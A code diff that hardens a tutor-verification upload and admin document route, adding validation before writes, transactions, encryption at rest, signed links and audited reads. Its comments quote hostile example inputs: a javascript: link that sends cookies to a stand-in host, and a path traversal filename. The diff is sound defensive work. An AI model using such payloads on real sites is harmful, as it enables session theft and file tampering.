@@ -4,6 +4,7 @@ import {
   and, eq, inArray, sql as raw,
   tutors, verificationDocs, notify,
   objectStore, storageKey,
+  docEncryptionConfigured, sealDoc, openDoc, DocCryptoError,
 } from "@tnajem/db";
 import { docKind } from "@tnajem/db";
 
@@ -19,7 +20,8 @@ import { db } from "../db";
 import { getSession } from "../lib/session";
 import { requireAdmin } from "../lib/admin";
 import { checkRateLimit } from "../lib/rate-limit";
-import { auditAdmin } from "../lib/audit";
+import { auditAdmin, auditAdminStrict } from "../lib/audit";
+import { checkDocLink, docLink } from "../lib/doc-links";
 
 /* uploads + admin — the most sensitive surface in the product. These endpoints
    accept, store and stream Tunisian national ID cards.
@@ -129,31 +131,6 @@ export async function adminRoutes(app: FastifyInstance): Promise<void> {
       return { ok: false, error: "too-many-documents" };
     }
 
-    /* Persist. Keys are verification/<tutorId>/<file> in the object store — never
-       a public directory or bucket, so nothing here is ever served statically; the
-       only reader is the admin-gated stream below. `mine.id` comes from the
-       session's own tutor row, so a tutor can only ever write into their OWN folder. */
-    const store = objectStore();
-
-    for (const { kind, bytes, mime, fileName } of incoming) {
-      /* safeFileName strips directory components and everything outside
-         [a-zA-Z0-9._-], so "../../../etc/cron.d/x" and NUL-byte tricks collapse to
-         a flat, inert name. */
-      const safe = `${kind}-${Date.now()}-${safeFileName(fileName, 60)}`;
-      await store.put(`verification/${mine.id}/${safe}`, bytes);
-      await db.insert(verificationDocs).values({
-        tutorId: mine.id,
-        kind,
-        // The SANITIZED name: this string is echoed into a Content-Disposition
-        // header by the stream route, and a raw client name could carry CR/LF.
-        fileName: safeFileName(fileName, 60),
-        // The object key itself: POSIX separators, always.
-        storagePath: `verification/${mine.id}/${safe}`,
-        mime, // the SNIFFED type — never the client's claim
-        sizeBytes: bytes.length,
-      });
-    }
-
     /* Text + link fields. The seven *Url fields land in the tutors row and are
        rendered as <a href> on the ADMIN review page — a tutor submitting
        `javascript:fetch('//evil.tn?c='+document.cookie)` as their "website" would
@@ -192,25 +169,74 @@ export async function adminRoutes(app: FastifyInstance): Promise<void> {
         ? Math.max(0, Math.min(60, parseInt(yearsRaw, 10) || 0))
         : null;
 
-    await db
-      .update(tutors)
-      .set({
-        status: "pending",
-        submittedAt: new Date(),
-        reviewNote: null,
-        experienceYears: years,
-        institution: institution.value,
-        languages: languages.value,
-        pitch: pitch.value,
-        linkedinUrl: linkedin.value,
-        instagramUrl: instagram.value,
-        tiktokUrl: tiktok.value,
-        youtubeUrl: youtube.value,
-        facebookUrl: facebook.value,
-        websiteUrl: website.value,
-        introVideoUrl: introVideo.value,
-      })
-      .where(eq(tutors.id, mine.id));
+    /* PERSIST — only now, after every field has been validated. It used to write the
+       ID scans first and validate the text fields after: a submission with a bad link
+       left files and rows behind for a tutor still in draft, which the retention
+       purge never reaches (it purges decided tutors), and four such attempts filled
+       the 24-document cap for good (security review, 15 Sept 2026).
+
+       Keys are verification/<tutorId>/<file> in the object store — never a public
+       directory or bucket; the only reader is the admin-gated route below. `mine.id`
+       comes from the session's own tutor row, so a tutor can only write into their
+       OWN folder. Each file is SEALED (packages/db/src/doc-crypto.ts) before it
+       leaves this process. */
+    const store = objectStore();
+    const stamp = Date.now();
+    const written = incoming.map((doc, i) => ({
+      ...doc,
+      /* safeFileName strips directory components and everything outside
+         [a-zA-Z0-9._-], so "../../../etc/cron.d/x" and NUL-byte tricks collapse to
+         a flat, inert name. The index keeps two files of one kind apart. */
+      key: `verification/${mine.id}/${doc.kind}-${stamp}-${i}-${safeFileName(doc.fileName, 60)}`,
+    }));
+
+    const sealing = docEncryptionConfigured();
+    if (!sealing) {
+      // Only reachable outside production: the API refuses to boot there without a key.
+      req.log.warn("DOC_ENCRYPTION_KEY is not set — storing identity documents UNENCRYPTED (development only)");
+    }
+    try {
+      for (const w of written) await store.put(w.key, sealing ? sealDoc(w.key, w.bytes) : w.bytes);
+      /* Rows and the status change in ONE transaction: a dossier is pending with all
+         of its documents, or not at all. */
+      await db.transaction(async (tx) => {
+        for (const w of written) {
+          await tx.insert(verificationDocs).values({
+            tutorId: mine.id,
+            kind: w.kind,
+            // The SANITIZED name: this string is echoed into a Content-Disposition
+            // header by the stream route, and a raw client name could carry CR/LF.
+            fileName: safeFileName(w.fileName, 60),
+            storagePath: w.key, // the object key itself: POSIX separators, always
+            mime: w.mime, // the SNIFFED type — never the client's claim
+            sizeBytes: w.bytes.length, // the document's size, not the sealed object's
+          });
+        }
+        await tx
+          .update(tutors)
+          .set({
+            status: "pending",
+            submittedAt: new Date(),
+            reviewNote: null,
+            experienceYears: years,
+            institution: institution.value,
+            languages: languages.value,
+            pitch: pitch.value,
+            linkedinUrl: linkedin.value,
+            instagramUrl: instagram.value,
+            tiktokUrl: tiktok.value,
+            youtubeUrl: youtube.value,
+            facebookUrl: facebook.value,
+            websiteUrl: website.value,
+            introVideoUrl: introVideo.value,
+          })
+          .where(eq(tutors.id, mine.id));
+      });
+    } catch (e) {
+      // Nothing half-submitted is left behind: files first, so remove what was written.
+      await Promise.all(written.map((w) => store.delete(w.key).catch(() => "missing")));
+      throw e;
+    }
 
     /* Tell a human. Without this the queue was write-only: a tutor uploaded their
        national ID, several screens told them someone would look at it, and no
@@ -321,6 +347,8 @@ export async function adminRoutes(app: FastifyInstance): Promise<void> {
         id: d.id,
         kind: d.kind,
         fileName: d.fileName,
+        // Short-lived and bound to THIS admin (lib/doc-links.ts). Never the bare id.
+        url: docLink(d.id, session.profile.id),
       })),
     }));
 
@@ -428,12 +456,24 @@ export async function adminRoutes(app: FastifyInstance): Promise<void> {
     return { ok: true, revalidate: { tutors: [t.slug], publicTutors: true } };
   });
 
-  /* ── GET /admin/doc/:id — streams a national ID scan ─────────────────────── */
-  app.get<{ Params: { id: string } }>("/admin/doc/:id", async (req, reply) => {
+  /* ── GET /admin/doc/:id?exp&sig — returns a national ID scan ─────────────── */
+  app.get<{ Params: { id: string }; Querystring: { exp?: string; sig?: string } }>("/admin/doc/:id", async (req, reply) => {
     const session = await requireAdmin(req);
     if (!session) return reply.code(403).type("text/plain").send("Forbidden");
 
     if (!isUuid(req.params.id)) return reply.code(400).type("text/plain").send("Bad request");
+
+    /* THE LINK. A document is never addressable by its id alone: the queue issues a
+       signed link per document, per admin, valid DOC_LINK_TTL_SEC. */
+    const link = checkDocLink(req.params.id, session.profile.id, req.query ?? {});
+    if (link === "expired") {
+      return reply
+        .code(410)
+        .type("text/plain; charset=utf-8")
+        .header("cache-control", "no-store")
+        .send("Lien expiré — rechargez la page de vérification. / انتهت صلوحية الرابط، عاود حمّل صفحة التثبّت.");
+    }
+    if (link !== "ok") return reply.code(403).type("text/plain").send("Forbidden");
 
     const [doc] = await db
       .select()
@@ -450,14 +490,34 @@ export async function adminRoutes(app: FastifyInstance): Promise<void> {
       return reply.code(400).type("text/plain").send("Bad request");
     }
 
-    let bytes: Buffer | null;
+    let stored: Buffer | null;
     try {
-      bytes = await objectStore().get(doc.storagePath);
+      stored = await objectStore().get(doc.storagePath);
     } catch (e) {
       req.log.error({ code: (e as { code?: string }).code ?? (e as Error).name }, "document store read failed");
       return reply.code(503).type("text/plain").send("Unavailable");
     }
-    if (!bytes) return reply.code(404).type("text/plain").send("Not found");
+    if (!stored) return reply.code(404).type("text/plain").send("Not found");
+
+    let bytes: Buffer;
+    try {
+      const opened = openDoc(doc.storagePath, stored);
+      if (opened.sealedWith === "plaintext") req.log.warn({ docId: doc.id }, "identity document stored unencrypted — run npm run db:encrypt-docs");
+      bytes = opened.plaintext;
+    } catch (e) {
+      const code = e instanceof DocCryptoError ? e.code : (e as Error).name;
+      req.log.error({ docId: doc.id, code }, "identity document could not be opened");
+      return reply.code(500).type("text/plain").send("Document unreadable");
+    }
+
+    /* EVERY READ IS AUDITED, and the audit row comes FIRST. Unlike a moderation
+       action, a disclosure without a record is the failure: if the row cannot be
+       written, the document is not sent. The request id ties the row to the log. */
+    try {
+      await auditAdminStrict(session.profile.id, "verification.doc.read", { kind: "verification_doc", id: doc.id }, `request ${req.id}`);
+    } catch {
+      return reply.code(503).type("text/plain").send("Unavailable");
+    }
 
     /* Every header below is deliberate. This is the one URL in the product that
        returns a Tunisian national ID card.
@@ -467,9 +527,11 @@ export async function adminRoutes(app: FastifyInstance): Promise<void> {
          - CSP default-src 'none' + sandbox: even a crafted SVG/HTML cannot run.
          - nosniff: stops the browser second-guessing the type.
          - no-store: an ID scan must not sit in a disk cache.
+         - ATTACHMENT, always: an ID scan is never rendered in the app's origin, and
+           CSP sandbox is the second wall behind that, not the first.
          - The filename is already sanitised at write time (CR/LF header injection). */
     const safeType = SAFE_MIME.test(doc.mime ?? "") ? (doc.mime as string) : "application/octet-stream";
-    const disposition = safeType === "application/octet-stream" ? "attachment" : "inline";
+    const disposition = "attachment";
 
     return reply
       .header("content-type", safeType)
